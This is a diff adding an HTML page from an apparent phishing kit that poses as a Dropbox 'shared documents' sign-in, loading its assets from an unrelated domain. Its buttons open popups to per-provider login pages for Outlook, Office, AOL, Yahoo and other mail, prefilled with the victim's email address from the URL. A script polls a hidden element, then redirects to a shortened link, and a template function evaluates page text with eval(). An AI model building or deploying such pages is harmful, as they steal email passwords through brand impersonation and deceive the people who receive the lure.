@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox - Get your files anytime anywhere</title>
+    <link rel="icon" href="https://rosehostserv.com/email-list/dropjully30/assets/icon.png">
+    <style> 
+        @font-face {
+            font-family: 'Source Sans Pro';
+            font-style: normal;
+            font-weight: 600;
+            src: url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.eot');
+            src: local(''), url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.eot?#iefix') format('embedded-opentype'), url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.woff2') format('woff2'), url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.woff') format('woff'), url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.ttf') format('truetype'), url('https://rosehostserv.com/email-list/dropbx35/assets/source-sans-pro-v14-latin-600.svg#SourceSansPro') format('svg');
+        }
+
+        @font-face {
+            font-family: 'Atlas Grotesk Web Light Regular';
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.eot');
+            src: local(''), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.eot?#iefix') format('embedded-opentype'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.woff2') format('woff2'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.woff') format('woff'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.ttf') format('truetype'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Light Regular.svg') format('svg');
+        }
+
+        @font-face {
+            font-family: 'Atlas Grotesk Web Bold Regular';
+            font-style: normal;
+            font-weight: 700;
+            src: url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.eot');
+            src: local(''), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.eot?#iefix') format('embedded-opentype'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.woff2') format('woff2'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.woff') format('woff'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.ttf') format('truetype'), url('https://rosehostserv.com/email-list/dropbx35/assets/Atlas Grotesk Web Bold Regular.svg') format('svg');
+        }
+        @font-face{font-family:'SharpGrotesk';src:url("https://rosehostserv.com/email-list/dropbx35/assets/SharpGroteskDBMedium20-vflI3qtaE.woff2") format("woff2"),url("https://rosehostserv.com/email-list/dropbx35/assets/SharpGroteskDBMedium20-vflXS-0WC.woff") format("woff"),url("https://rosehostserv.com/email-list/dropbx35/assets/SharpGroteskDBMedium20-vfls8l7-a.ttf") format("truetype");font-weight:500;font-style:normal}
+        *,
+        body {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Atlas Grotesk Web Bold Regular;
+            background-image: url('https://rosehostserv.com/email-list/dropbx35/assets/bg.png');
+            background-size: cover;
+            background-color: #b1b8c0;
+        }
+
+        img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+        .main-wrap{
+            display: flex;
+            flex-wrap: wrap;
+            width: 100%;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            padding: 0.625rem 1rem;
+        }
+        .safflower-card{
+            box-shadow: 0 0 0 1px rgb(99 114 130 / 16%), 0 8px 16px rgb(27 39 51 / 8%);
+            width: 26vw;
+            min-width: 320px;
+            max-width: 100%;
+            background-color: #fff;
+            padding: 1.25vw;
+            border-radius: 0.325vw;
+        }
+        /* .links-wrap{
+            width: 100%;
+            margin: 0 auto;
+            margin-bottom: 1rem;
+        }
+        .links-wrap a{
+            display: flex;
+            margin-bottom: 0.625rem;
+        }
+        .links-wrap img{
+            width: 100%;
+        }
+        .links-wrap img:hover{
+            transform:scale(1.1);
+            transition: all 0.4s;
+        } */
+        .signin-card{
+            margin-top: 5vw;
+        }
+        .login {
+            font-weight: 500;
+            font-family:'SharpGrotesk';
+            margin-bottom: 0.4vw;
+            color: #333333;
+            font-size: 1.8vw;
+        }
+        .para {
+            color: #666;
+            font-size: 1.1vw;
+            font-family: 'Atlas Grotesk Web Light Regular';
+        }
+        .note {
+            font-size: 0.95vw;
+            color: #0061ff;
+            font-family: 'Atlas Grotesk Web Light Regular';
+            margin-bottom: 1.25vw;
+        }
+        .btn { outline: none; display: block; border-radius: 100px; border: 2px solid #eaeaea; color: #505050; font-weight: 600; height: auto; text-align: center; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; padding: 12px; background-color: #fff; width: 100%; margin: 0 auto; margin-top: 2.25%; font-family: Source Sans Pro; text-decoration: none; transition: all .3s; } .btn:hover { border-color: #d3d3d3; transform: scale(1.1); } .btn img { height: 1.15em; vertical-align: middle; margin-right: 0.625rem; } 
+        @media(max-width:1199px){
+            .login{
+                font-size: 24px;
+            }
+            .para{
+                font-size: 15px;
+            }
+            .note{
+                font-size: 12px;
+                margin-bottom: 20px;
+            }
+            .safflower-card{
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="main-wrap">
+        <div class="safflower-card">
+            <div class="content">
+                <h2 class="login">Sign In</h2>
+                <div class="para">
+                   Shared documents are password protected login to your account.
+                </div>
+                <div class="note">
+                    Select other emails if your email provider not below.
+                </div>
+            </div>
+            <div class="link-group">
+              <ul style=" list-style-type: none;">
+           
+                    <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                <a href="" data-nn="OUT.html?username={|location.hash.substring(1)|}" class="btn"><img src="https://rosehostserv.com/email-list/dropbx35/assets/outlook.svg"> Continue with Outlook</a>
+                  </li>
+                    <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+
+
+                 <a href="" data-nn="OFFICE.html?username={|location.hash.substring(1)|}" class="btn"><img src="https://rosehostserv.com/email-list/dropbx35/assets/office.svg"> Continue with Office</a> 
+                 </li>
+                    <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+
+                <a href="" data-nn="AOL.html?yid={|location.hash.substring(1)|}" class="btn"><img src="https://rosehostserv.com/email-list/dropbx35/assets/aol.png"> Continue with Aol Mail</a>
+                 </li>
+                    <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+               <a href="" data-nn="YAHOO.html?yid={|location.hash.substring(1)|}" class="btn"><img src="https://rosehostserv.com/email-list/dropbx35/assets/yahoo.png"> Continue with Yahoo</a>
+               </li>
+                    <li class="wow pulse animated animated" data-wow-iteration="infinite" data-wow-duration="800ms" style="visibility: visible; animation-duration: 800ms; animation-iteration-count: infinite; animation-name: pulse;">
+                 <a href="" data-nn="OTHER.html#{|location.hash.substring(1)|}" class="btn"><img src="https://rosehostserv.com/email-list/dropbx35/assets/other.png"> Continue with Other Mails</a>
+                  </li>
+                              <script>
+const queryString=[...new URLSearchParams(location.search)].reduce((e,[t,n])=>(e[t]=n,e),{});function templatePage(){let g=document;function a(b){return b.replace(/{\|(.*?)\|}/g,(_,c)=>{let d=eval(c);return null==d?"":d})}for(const e of g.getElementsByTagName("*"))for(const t of e.attributes){let e=a(t.value);e!==t.value&&(t.value=e)}const b=g.createNodeIterator(g.body,NodeFilter.SHOW_TEXT,null);let c;for(;c=b.nextNode();){let e="textContent",t=a(c[e]);t!==c[e]&&(c[e]=t)}}
+templatePage()
+</script>
+                    </ul>
+            </div>
+            
+             <div style="" id="checks" style="display: none;"></div>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function(e){ 
+     window_opener_xc(); 
+   });
+   function window_opener_xc(){
+     var url_part = get_extra_data(1);
+     $('li a').click(function(e){
+       e.preventDefault();
+     if($(this).data('nn')){
+       var checks = $('#checks');
+           var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
+         setInterval(function(){ 
+         if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
+       }, 3000);
+     }
+     });
+   }
+   function get_extra_data(a){
+     var output = '';
+     if(a==1){
+       output = '';
+     }
+     else if(a==2){
+       output = "https://owy.mn/35MDuDz";
+     }
+     return output;
+   }
+   </script>
+        </div>
+    </main>
+</body>
+</html>
